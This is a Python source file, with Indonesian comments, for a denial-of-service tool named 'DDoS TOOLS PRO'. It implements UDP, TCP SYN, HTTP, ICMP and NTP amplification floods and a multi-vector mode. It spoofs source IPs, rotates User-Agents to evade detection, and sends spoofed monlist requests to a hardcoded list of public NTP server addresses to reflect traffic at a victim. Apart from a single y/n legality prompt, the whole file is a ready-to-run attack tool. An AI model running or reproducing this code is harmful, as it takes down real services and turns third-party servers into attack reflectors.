import socket
import requests
import threading
import random
import time
import argparse
import os
import sys
from datetime import datetime
from colorama import Fore, Style, init
import traceback

# Try specific scapy imports
try:
    from scapy.layers.inet import IP, TCP, UDP, ICMP
    from scapy.sendrecv import send, sr1
    from scapy.utils import RandIP, RandShort, RandInt, RandString
    from scapy.packet import Raw
except ImportError:
    print(f"{Fore.RED}[ERROR] Gagal mengimpor modul scapy. Pastikan scapy sudah terinstall.{Style.RESET_ALL}")
    sys.exit(1)

# Inisialisasi colorama
init(autoreset=True)

# Kelas untuk menyimpan statistik serangan
class AttackStats:
    def __init__(self):
        self.packets_sent = 0
        self.bytes_sent = 0
        self.start_time = time.time()
        self.lock = threading.Lock()

    def update(self, packets, bytes_sent):
        with self.lock:
            self.packets_sent += packets
            self.bytes_sent += bytes_sent

    def get_stats(self):
        duration = time.time() - self.start_time
        with self.lock:
            pps = self.packets_sent / duration if duration > 0 else 0
            mbps = (self.bytes_sent * 8 / 1_000_000) / duration if duration > 0 else 0
            return {
                "packets": self.packets_sent,
                "bytes": self.bytes_sent,
                "duration": duration,
                "pps": pps,
                "mbps": mbps
            }

# Statistik global
stats = AttackStats()

# UDP Flood dengan payload yang dapat dikonfigurasi
def udp_flood(ip, port, payload_size=1024, interval=0):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    while True:
        try:
            # Buat payload acak dengan ukuran yang dapat dikonfigurasi
            bytes_to_send = random._urandom(payload_size)
            sock.sendto(bytes_to_send, (ip, port))

            # Update statistik
            stats.update(1, payload_size)

            print(f"{Fore.GREEN}[UDP] Menyerang {ip}:{port} - {payload_size} bytes{Style.RESET_ALL}")

            # Interval antar paket (untuk kontrol kecepatan)
            if interval > 0:
                time.sleep(interval)

        except Exception as e:
            print(f"{Fore.RED}[UDP] Error: {str(e)}{Style.RESET_ALL}")
            traceback.print_exc()
            time.sleep(1)
        except KeyboardInterrupt:
            print(f"{Fore.CYAN}[INFO] UDP Flood dihentikan.{Style.RESET_ALL}")
            break


# TCP SYN Flood dengan opsi tambahan
def tcp_syn_flood(ip, port, flags="S", interval=0):
    while True:
        try:
            # Buat paket dengan flag yang dapat dikonfigurasi (misalnya SYN, ACK, dll)
            ip_layer = IP(dst=ip, src=RandIP())  # Spoofing IP sumber
            tcp_layer = TCP(sport=RandShort(), dport=port, flags=flags, seq=RandInt(), window=RandShort())

            # Tambahkan payload acak
            payload = Raw(load=RandString(size=random.randint(64, 1024)))
            packet = ip_layer / tcp_layer / payload

            # Kirim paket
            send(packet, verbose=False)

            # Update statistik
            stats.update(1, len(packet))

            print(f"{Fore.BLUE}[TCP {flags}] Menyerang {ip}:{port} - {len(packet)} bytes{Style.RESET_ALL}")

            # Interval antar paket
            if interval > 0:
                time.sleep(interval)

        except Exception as e:
            print(f"{Fore.RED}[TCP] Error: {str(e)}{Style.RESET_ALL}")
            traceback.print_exc()
            time.sleep(1)
        except KeyboardInterrupt:
            print(f"{Fore.CYAN}[INFO] TCP SYN Flood dihentikan.{Style.RESET_ALL}")
            break

# HTTP Flood dengan header kustom dan metode yang dapat dikonfigurasi
def http_flood(url, method="GET", headers=None, data=None, interval=0):
    if headers is None:
        # User-Agent acak untuk menghindari deteksi
        headers = {
            "User-Agent": random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.0; rv:120.0) Gecko/20100101 Firefox/120.0",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
            ]),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache"
        }

    session = requests.Session()

    while True:
        try:
            # Tambahkan parameter acak ke URL untuk menghindari cache
            target_url = url
            if "?" not in url:
                target_url += f"?cache={random.randint(1, 999999)}"
            else:
                target_url += f"&cache={random.randint(1, 999999)}"

            # Buat request berdasarkan metode
            if method.upper() == "GET":
                response = session.get(target_url, headers=headers, timeout=5)
            elif method.upper() == "POST":
                response = session.post(target_url, headers=headers, data=data, timeout=5)
            elif method.upper() == "HEAD":
                response = session.head(target_url, headers=headers, timeout=5)
            else:
                print(f"{Fore.RED}[HTTP] Metode tidak valid: {method}{Style.RESET_ALL}")
                break

            content_length = len(response.content) if hasattr(response, 'content') else 0

            # Update statistik
            stats.update(1, content_length)

            print(f"{Fore.CYAN}[HTTP {method}] Menyerang {url} - Status: {response.status_code} - {content_length} bytes{Style.RESET_ALL}")

            # Interval antar request
            if interval > 0:
                time.sleep(interval)

        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[HTTP] Error: {str(e)}{Style.RESET_ALL}")
            traceback.print_exc()
            time.sleep(2)
        except Exception as e:
            print(f"{Fore.RED}[HTTP] Error tidak terduga: {str(e)}{Style.RESET_ALL}")
            traceback.print_exc()
            time.sleep(2)
        except KeyboardInterrupt:
            print(f"{Fore.CYAN}[INFO] HTTP Flood dihentikan.{Style.RESET_ALL}")
            break

# ICMP (Ping) Flood
def icmp_flood(ip, payload_size=56, interval=0):
    while True:
        try:
            ip_layer = IP(dst=ip, src=RandIP())
            icmp_layer = ICMP(type=8, code=0, id=RandShort(), seq=RandShort())
            payload = Raw(load=RandString(size=payload_size))
            packet = ip_layer / icmp_layer / payload

            send(packet, verbose=False)

            # Update statistik
            stats.update(1, len(packet))

            print(f"{Fore.YELLOW}[ICMP] Menyerang {ip} - {len(packet)} bytes{Style.RESET_ALL}")

            if interval > 0:
                time.sleep(interval)

        except Exception as e:
            print(f"{Fore.RED}[ICMP] Error: {str(e)}{Style.RESET_ALL}")
            traceback.print_exc()
            time.sleep(1)
        except KeyboardInterrupt:
            print(f"{Fore.CYAN}[INFO] ICMP Flood dihentikan.{Style.RESET_ALL}")
            break


# NTP Amplification
def ntp_amplification(target_ip, target_port, ntp_servers):
    if not ntp_servers:
        print(f"{Fore.RED}[NTP] Tidak ada server NTP yang tersedia untuk amplifikasi{Style.RESET_ALL}")
        return

    while True:
        try:
            # Pilih server NTP acak dari daftar
            ntp_server = random.choice(ntp_servers)

            # Buat paket monlist request spoofing IP target
            ip_layer = IP(dst=ntp_server, src=target_ip)
            udp_layer = UDP(sport=random.randint(1024, 65535), dport=123)

            # Payload monlist request (0x17 = monlist command)
            payload = Raw(load=bytes.fromhex("1700030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"))

            packet = ip_layer / udp_layer / payload
            send(packet, verbose=False)

            # Update statistik
            stats.update(1, len(packet))

            print(f"{Fore.MAGENTA}[NTP Amplification] Menyerang {target_ip}:{target_port} melalui {ntp_server}{Style.RESET_ALL}")

            time.sleep(0.5)  # Perlambat sedikit untuk stabilitas

        except Exception as e:
            print(f"{Fore.RED}[NTP] Error: {str(e)}{Style.RESET_ALL}")
            traceback.print_exc()
            time.sleep(1)
        except KeyboardInterrupt:
            print(f"{Fore.CYAN}[INFO] NTP Amplification dihentikan.{Style.RESET_ALL}")
            break

# Fungsi untuk menampilkan statistik secara berkala
def display_stats():
    while True:
        time.sleep(2)
        stats_data = stats.get_stats()
        os.system('cls' if os.name == 'nt' else 'clear')  # Perhatikan: Ini mungkin tidak berfungsi di semua terminal
        print(f"""
{Fore.CYAN}╔══════════════════════════════════════════════╗
{Fore.CYAN}║{Fore.WHITE}             STATISTIK SERANGAN              {Fore.CYAN}║
{Fore.CYAN}╠══════════════════════════════════════════════╣
{Fore.CYAN}║{Fore.WHITE} Paket Terkirim   : {stats_data['packets']:<20,} {Fore.CYAN}║
{Fore.CYAN}║{Fore.WHITE} Bytes Terkirim   : {stats_data['bytes']:<20,} {Fore.CYAN}║
{Fore.CYAN}║{Fore.WHITE} Durasi           : {stats_data['duration']:.2f} detik{' ' * 12}{Fore.CYAN}║
{Fore.CYAN}║{Fore.WHITE} Kecepatan        : {stats_data['pps']:.2f} paket/detik{' ' * 5}{Fore.CYAN}║
{Fore.CYAN}║{Fore.WHITE} Bandwidth        : {stats_data['mbps']:.2f} Mbps{' ' * 14}{Fore.CYAN}║
{Fore.CYAN}╚══════════════════════════════════════════════╝
        """)

# Fungsi untuk memeriksa apakah host hidup
def check_target(target):
    try:
        if "://" in target:
            # Cek jika target adalah URL
            response = requests.head(target, timeout=5)
            print(f"{Fore.GREEN}[INFO] Target hidup: {target} - Status: {response.status_code}{Style.RESET_ALL}")
            return True
        else:
            # Cek jika target adalah IP
            ip = socket.gethostbyname(target)
            packet = IP(dst=ip)/ICMP()
            response = sr1(packet, timeout=3, verbose=False)
            if response:
                print(f"{Fore.GREEN}[INFO] Target hidup: {ip}{Style.RESET_ALL}")
                return True
            else:
                print(f"{Fore.RED}[INFO] Target tidak merespons: {ip}{Style.RESET_ALL}")
                return False
    except Exception as e:
        print(f"{Fore.RED}[INFO] Tidak dapat menjangkau target: {str(e)}{Style.RESET_ALL}")
        return False

# Menu bantuan
def print_help():
    print(f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════════╗
{Fore.CYAN}║{Fore.WHITE}                      BANTUAN PENGGUNAAN                       {Fore.CYAN}║
{Fore.CYAN}╠══════════════════════════════════════════════════════════════════╣
{Fore.CYAN}║{Fore.WHITE} 1. UDP Flood     : Mengirim paket UDP acak ke target          {Fore.CYAN}║
{Fore.CYAN}║{Fore.WHITE} 2. TCP SYN Flood : Mengirim paket TCP SYN ke target           {Fore.CYAN}║
{Fore.CYAN}║{Fore.WHITE} 3. HTTP Flood    : Melakukan request HTTP ke target           {Fore.CYAN}║
{Fore.CYAN}║{Fore.WHITE} 4. ICMP Flood    : Mengirim paket ICMP (ping) ke target       {Fore.CYAN}║
{Fore.CYAN}║{Fore.WHITE} 5. NTP Amplif.   : Serangan menggunakan amplifikasi NTP       {Fore.CYAN}║
{Fore.CYAN}║{Fore.WHITE}                                                              {Fore.CYAN}║
{Fore.CYAN}║{Fore.YELLOW} Parameter tambahan:                                          {Fore.CYAN}║
{Fore.CYAN}║{Fore.WHITE}   -t [jumlah]    : Jumlah thread yang digunakan               {Fore.CYAN}║
{Fore.CYAN}║{Fore.WHITE}   -s [ukuran]    : Ukuran payload dalam bytes                 {Fore.CYAN}║
{Fore.CYAN}║{Fore.WHITE}   -i [interval]  : Interval antar paket (detik)               {Fore.CYAN}║
{Fore.CYAN}╚══════════════════════════════════════════════════════════════════╝
    """)

# Fungsi utama
def main():
    # Buat parser argumen
    parser = argparse.ArgumentParser(description="DDoS Tool - Advanced", add_help=False)
    parser.add_argument("-h", "--help", action="store_true", help="Tampilkan bantuan")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Jumlah thread")
    parser.add_argument("-s", "--size", type=int, default=1024, help="Ukuran payload dalam bytes")
    parser.add_argument("-i", "--interval", type=float, default=0, help="Interval antar paket (detik)")
    parser.add_argument("-d", "--duration", type=int, default=0, help="Durasi serangan (detik)")

    # Coba parse argumen (jika ada) atau lanjutkan ke mode menu
    try:
        args, unknown = parser.parse_known_args()
        if args.help:
            print_help()
            return
    except:
        args = parser.parse_args([])

    # Tampilkan banner
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
    {Fore.CYAN}╔══════════════════════════════════════════════╗
    {Fore.CYAN}║{Fore.RED}               DDoS TOOLS PRO              {Fore.CYAN}║
    {Fore.CYAN}║{Fore.WHITE}      Powerful Network Testing Tool       {Fore.CYAN}║
    {Fore.CYAN}║{Fore.YELLOW}          Dibuat oleh: XX3T1             {Fore.CYAN}║
    {Fore.CYAN}╚══════════════════════════════════════════════╝
    {Style.RESET_ALL}
    """)

    # Input target
    target = input(f"{Fore.WHITE}[?] Masukkan IP atau Domain target: {Style.RESET_ALL}")

    if not target:
        print(f"{Fore.RED}[ERROR] Target tidak boleh kosong!{Style.RESET_ALL}")
        return

    # Periksa apakah target dapat dijangkau
    if not check_target(target):
        confirm = input(f"{Fore.YELLOW}[!] Target tidak merespons. Lanjutkan? (y/n): {Style.RESET_ALL}").lower()
        if confirm != 'y':
            print(f"{Fore.YELLOW}[INFO] Operasi dibatalkan.{Style.RESET_ALL}")
            return

    # Menu serangan
    print(f"""
    {Fore.WHITE}[{Fore.CYAN}1{Fore.WHITE}] UDP Flood
    {Fore.WHITE}[{Fore.CYAN}2{Fore.WHITE}] TCP SYN Flood
    {Fore.WHITE}[{Fore.CYAN}3{Fore.WHITE}] HTTP Flood
    {Fore.WHITE}[{Fore.CYAN}4{Fore.WHITE}] ICMP (Ping) Flood
    {Fore.WHITE}[{Fore.CYAN}5{Fore.WHITE}] NTP Amplification
    {Fore.WHITE}[{Fore.CYAN}6{Fore.WHITE}] Multi-vector (Kombinasi serangan)
    {Style.RESET_ALL}
    """)

    # Pilih mode serangan
    try:
        mode = int(input(f"{Fore.WHITE}[?] Pilih mode serangan (1-6): {Style.RESET_ALL}"))
        if mode not in range(1, 7):
            print(f"{Fore.RED}[ERROR] Pilihan tidak valid!{Style.RESET_ALL}")
            return
    except ValueError:
        print(f"{Fore.RED}[ERROR] Input harus berupa angka!{Style.RESET_ALL}")
        return

    # Parameter khusus berdasarkan mode serangan
    port = 80  # Default port

    # Jika bukan HTTP Flood, minta port
    if mode != 3:
        try:
            port = int(input(f"{Fore.WHITE}[?] Masukkan port target (default: 80): {Style.RESET_ALL}") or "80")
        except ValueError:
            print(f"{Fore.RED}[ERROR] Port harus berupa angka!{Style.RESET_ALL}")
            return

    # Parameter tambahan
    thread_count = args.threads
    try:
        input_threads = input(f"{Fore.WHITE}[?] Jumlah thread (default: {thread_count}): {Style.RESET_ALL}")
        if input_threads:
            thread_count = int(input_threads)
    except ValueError:
        print(f"{Fore.YELLOW}[WARN] Input tidak valid, menggunakan nilai default: {thread_count}{Style.RESET_ALL}")

    payload_size = args.size
    try:
        input_size = input(f"{Fore.WHITE}[?] Ukuran payload dalam bytes (default: {payload_size}): {Style.RESET_ALL}")
        if input_size:
            payload_size = int(input_size)
    except ValueError:
        print(f"{Fore.YELLOW}[WARN] Input tidak valid, menggunakan nilai default: {payload_size}{Style.RESET_ALL}")

    interval = args.interval
    try:
        input_interval = input(f"{Fore.WHITE}[?] Interval antar paket dalam detik (default: {interval}): {Style.RESET_ALL}")
        if input_interval:
            interval = float(input_interval)
    except ValueError:
        print(f"{Fore.YELLOW}[WARN] Input tidak valid, menggunakan nilai default: {interval}{Style.RESET_ALL}")

    # Mulai thread untuk menampilkan statistik
    threading.Thread(target=display_stats, daemon=True).start()

    # Siapkan URL lengkap jika mode HTTP Flood
    url = target
    if mode == 3:
        # Pastikan URL memiliki protokol
        if not url.startswith(('http://', 'https://')):
            protocol = input(f"{Fore.WHITE}[?] Protokol (1=HTTP, 2=HTTPS, default=1): {Style.RESET_ALL}")
            if protocol == '2':
                url = f"https://{url}"
            else:
                url = f"http://{url}"

        # Tambahkan path jika pengguna mau
        path = input(f"{Fore.WHITE}[?] Path (default='/'): {Style.RESET_ALL}")
        if path and not path.startswith('/'):
            path = f"/{path}"
        if path:
            url = f"{url}{path}"
        elif not url.endswith('/'):
            url = f"{url}/"

        # Pilih metode HTTP
        print(f"""
        {Fore.WHITE}[{Fore.CYAN}1{Fore.WHITE}] GET
        {Fore.WHITE}[{Fore.CYAN}2{Fore.WHITE}] POST
        {Fore.WHITE}[{Fore.CYAN}3{Fore.WHITE}] HEAD
        {Style.RESET_ALL}
        """)

        http_method = "GET"
        method_choice = input(f"{Fore.WHITE}[?] Pilih metode HTTP (default=1): {Style.RESET_ALL}")
        if method_choice == '2':
            http_method = "POST"
        elif method_choice == '3':
            http_method = "HEAD"

    # Daftar server NTP untuk amplifikasi (jika dipilih)
    ntp_servers = []
    if mode == 5:
        print(f"{Fore.YELLOW}[INFO] Mempersiapkan daftar server NTP untuk amplifikasi...{Style.RESET_ALL}")
        # Ini biasanya diambil dari daftar yang sudah diketahui atau discan
        # Di sini kita hanya menggunakan contoh
        ntp_servers = [
            "123.108.200.203", "185.209.85.106", "185.183.182.12",
            "199.204.60.126", "196.3.61.5", "91.189.89.199",
            "128.138.141.172", "69.89.207.199", "193.182.111.142"
        ]
        print(f"{Fore.GREEN}[INFO] {len(ntp_servers)} server NTP siap digunakan{Style.RESET_ALL}")

    # Konfirmasi serangan
    print(f"""
    {Fore.YELLOW}╔═══════════════════════════════════════════╗
    {Fore.YELLOW}║{Fore.WHITE}            DETAIL SERANGAN              {Fore.YELLOW}║
    {Fore.YELLOW}╠═══════════════════════════════════════════╣
    {Fore.YELLOW}║{Fore.WHITE} Target    : {target}{' ' * (30 - len(str(target)))}{Fore.YELLOW}║
    {Fore.YELLOW}║{Fore.WHITE} Port      : {port}{' ' * (30 - len(str(port)))}{Fore.YELLOW}║
    {Fore.YELLOW}║{Fore.WHITE} Threads   : {thread_count}{' ' * (30 - len(str(thread_count)))}{Fore.YELLOW}║
    {Fore.YELLOW}║{Fore.WHITE} Mode      : {['UDP', 'TCP SYN', 'HTTP', 'ICMP', 'NTP Amp', 'Multi'][mode-1]}{' ' * (30 - len(['UDP', 'TCP SYN', 'HTTP', 'ICMP', 'NTP Amp', 'Multi'][mode-1]))}{Fore.YELLOW}║
    {Fore.YELLOW}╚═══════════════════════════════════════════╝
    {Style.RESET_ALL}
    """)

    confirm = input(f"{Fore.RED}[!] PERINGATAN: Serangan DDoS ilegal jika tanpa izin! Lanjutkan? (y/n): {Style.RESET_ALL}").lower()
    if confirm != 'y':
        print(f"{Fore.YELLOW}[INFO] Operasi dibatalkan.{Style.RESET_ALL}")
        return

    print(f"{Fore.GREEN}[INFO] Memulai serangan...{Style.RESET_ALL}")

    # Mulai serangan berdasarkan mode
    try:
        if mode == 1:  # UDP Flood
            for _ in range(thread_count):
                threading.Thread(target=udp_flood, args=(target, port, payload_size, interval), daemon=True).start()

        elif mode == 2:  # TCP SYN Flood
            for _ in range(thread_count):
                threading.Thread(target=tcp_syn_flood, args=(target, port, "S", interval), daemon=True).start()

        elif mode == 3:  # HTTP Flood
            for _ in range(thread_count):
                threading.Thread(target=http_flood, args=(url, http_method, None, None, interval), daemon=True).start()

        elif mode == 4:  # ICMP Flood
            for _ in range(thread_count):
                threading.Thread(target=icmp_flood, args=(target, payload_size, interval), daemon=True).start()

        elif mode == 5:  # NTP Amplification
            for _ in range(thread_count):
                threading.Thread(target=ntp_amplification, args=(target, port, ntp_servers), daemon=True).start()

        elif mode == 6:  # Multi-vector
            # Distribusi thread untuk serangan multi-vector
            udp_threads = max(1, thread_count // 4)
            tcp_threads = max(1, thread_count // 4)
            http_threads = max(1, thread_count // 4)
            icmp_threads = max(1, thread_count // 4)

            print(f"{Fore.YELLOW}[INFO] Menggunakan serangan multi-vector dengan distribusi:{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[INFO] - {udp_threads} thread UDP Flood{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[INFO] - {tcp_threads} thread TCP SYN Flood{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[INFO] - {http_threads} thread HTTP Flood{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[INFO] - {icmp_threads} thread ICMP Flood{Style.RESET_ALL}")

            # Mulai semua jenis serangan
            for _ in range(udp_threads):
                threading.Thread(target=udp_flood, args=(target, port, payload_size, interval), daemon=True).start()

            for _ in range(tcp_threads):
                threading.Thread(target=tcp_syn_flood, args=(target, port, "S", interval), daemon=True).start()

            # Hanya jika URL sudah disiapkan
            if url.startswith(('http://', 'https://')):
                for _ in range(http_threads):
                    threading.Thread(target=http_flood, args=(url, "GET", None, None, interval), daemon=True).start()

            for _ in range(icmp_threads):
                threading.Thread(target=icmp_flood, args=(target, payload_size, interval), daemon=True).start()

    except Exception as e:
        print(f"{Fore.RED}[ERROR] Terjadi kesalahan saat memulai serangan: {str(e)}{Style.RESET_ALL}")
        traceback.print_exc()

    # Durasi serangan (jika ditentukan)
    duration = args.duration
    try:
        input_duration = input(f"{Fore.WHITE}[?] Durasi serangan dalam detik (0=tanpa batas): {Style.RESET_ALL}")
        if input_duration:
            duration = int(input_duration)
    except ValueError:
        print(f"{Fore.YELLOW}[WARN] Input tidak valid, menggunakan nilai default: tanpa batas{Style.RESET_ALL}")

    # Tunggu hingga durasi berakhir atau tekan CTRL+C untuk berhenti
    if duration > 0:
        try:
            print(f"{Fore.YELLOW}[INFO] Serangan akan berhenti dalam {duration} detik. Tekan CTRL+C untuk berhenti lebih awal.{Style.RESET_ALL}")
            time.sleep(duration)
            print(f"{Fore.GREEN}[INFO] Serangan selesai (durasi {duration} detik).{Style.RESET_ALL}")
            return
        except KeyboardInterrupt:
            pass
    else:
        try:
            print(f"{Fore.YELLOW}[INFO] Serangan berjalan. Tekan CTRL+C untuk berhenti.{Style.RESET_ALL}")
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            pass

    print(f"{Fore.GREEN}[INFO] Serangan dihentikan.{Style.RESET_ALL}")

if __name__ == "__main__":
    try:
        # Periksa apakah berjalan sebagai root (untuk Linux/Unix) atau admin (untuk Windows)
        if os.name == 'nt':
            import ctypes
            if not ctypes.windll.shell32.IsUserAnAdmin():
                print(f"{Fore.YELLOW}[WARN] Untuk fungsionalitas penuh, jalankan sebagai Administrator{Style.RESET_ALL}")
        else:
            # Tidak perlu cek root di Termux, tapi tambahkan catatan jika ada masalah permission
            pass #if os.geteuid() != 0:
            #    print(f"{Fore.YELLOW}[WARN] Untuk fungsionalitas penuh, jalankan sebagai root (sudo){Style.RESET_ALL}")

        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[INFO] Program dihentikan oleh pengguna.{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}[ERROR] Terjadi kesalahan tak terduga: {str(e)}{Style.RESET_ALL}")
        traceback.print_exc()